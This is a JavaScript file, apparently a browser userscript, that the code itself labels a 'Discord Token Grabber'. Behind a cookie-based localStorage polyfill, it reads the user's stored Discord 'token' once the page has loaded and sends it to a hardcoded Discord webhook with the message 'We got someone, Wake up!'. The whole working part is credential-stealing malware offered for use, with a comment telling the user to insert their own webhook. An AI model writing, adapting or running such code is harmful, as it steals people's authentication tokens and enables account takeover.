(function () {
    'use strict';
 
    // implement localstorage behavior using cookie
    //---------------------------------------------
    if(!window.localStorage) {
       Object.defineProperty(window, "localStorage", new(function () {
          var aKeys = [],
             oStorage = {};
          Object.defineProperty(oStorage, "getItem", {
             value: function (sKey) {
                return this[sKey] ? this[sKey] : null;
             },
             writable: false,
             configurable: false,
             enumerable: false
          });
          Object.defineProperty(oStorage, "key", {
             value: function (nKeyId) {
                return aKeys[nKeyId];
             },
             writable: false,
             configurable: false,
             enumerable: false
          });
          Object.defineProperty(oStorage, "setItem", {
             value: function (sKey, sValue) {
                if(!sKey) {
                   return;
                }
                document.cookie = escape(sKey) + "=" + escape(sValue) + "; expires=Tue, 19 Jan 2038 03:14:07 GMT; path=/";
             },
             writable: false,
             configurable: false,
             enumerable: false
          });
          Object.defineProperty(oStorage, "length", {
             get: function () {
                return aKeys.length;
             },
             configurable: false,
             enumerable: false
          });
          Object.defineProperty(oStorage, "removeItem", {
             value: function (sKey) {
                if(!sKey) {
                   return;
                }
                document.cookie = escape(sKey) + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/";
             },
             writable: false,
             configurable: false,
             enumerable: false
          });
          Object.defineProperty(oStorage, "clear", {
             value: function () {
                if(!aKeys.length) {
                   return;
                }
                for(var sKey in aKeys) {
                   document.cookie = escape(sKey) + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/";
                }
             },
             writable: false,
             configurable: false,
             enumerable: false
          });
          this.get = function () {
             var iThisIndx;
             for(var sKey in oStorage) {
                iThisIndx = aKeys.indexOf(sKey);
                if(iThisIndx === -1) {
                   oStorage.setItem(sKey, oStorage[sKey]);
                } else {
                   aKeys.splice(iThisIndx, 1);
                }
                delete oStorage[sKey];
             }
             for(aKeys; aKeys.length > 0; aKeys.splice(0, 1)) {
                oStorage.removeItem(aKeys[0]);
             }
             for(var aCouple, iKey, nIdx = 0, aCouples = document.cookie.split(/\s*;\s*/); nIdx < aCouples.length; nIdx++) {
                aCouple = aCouples[nIdx].split(/\s*=\s*/);
                if(aCouple.length > 1) {
                   oStorage[iKey = unescape(aCouple[0])] = unescape(aCouple[1]);
                   aKeys.push(iKey);
                }
             }
             return oStorage;
          };
          this.configurable = false;
          this.enumerable = true;
       })());
    }
    //---------------------------------------------------
    
    function dmdisc(message) {
        let webhookurl = "https://discord.com/api/webhooks/1247364290084606052/CnNsZ184abYfD1kj3yAtkOH873RS4c7HVpD5Ryps2wX5Sv4pG-zz9KCRZmPYHIff3llm"; //put your webhook url here.
        let request = new XMLHttpRequest();
        request.open("POST", webhookurl);

        request.setRequestHeader('Content-type', 'application/json');

        let params = {
        username: ".:Discord Token Grabber 1.0:.",
        avatar_url: "https://cdn.discordapp.com/attachments/1239347707546439774/1252148034498990122/2024-06-04_055910.png?ex=6671d1fb&is=6670807b&hm=98057ac88d81eea1813fc7e2f9fb9926443d0a2eec23cc1a9c63762e2ecafc72&",
        content: '**We got someone, Wake up!\nToken: '+message+'**'
        }

        request.send(JSON.stringify(params));
    }

    var userToken = localStorage.getItem('token');
 
    document.addEventListener('readystatechange', event => {
       if(event.target.readyState === "interactive") {} else if(event.target.readyState === "complete") {
          setTimeout(function () {
             setTimeout(function () {dmdisc(userToken);},1000); 
          }, 3000);
       }
    });
 })();
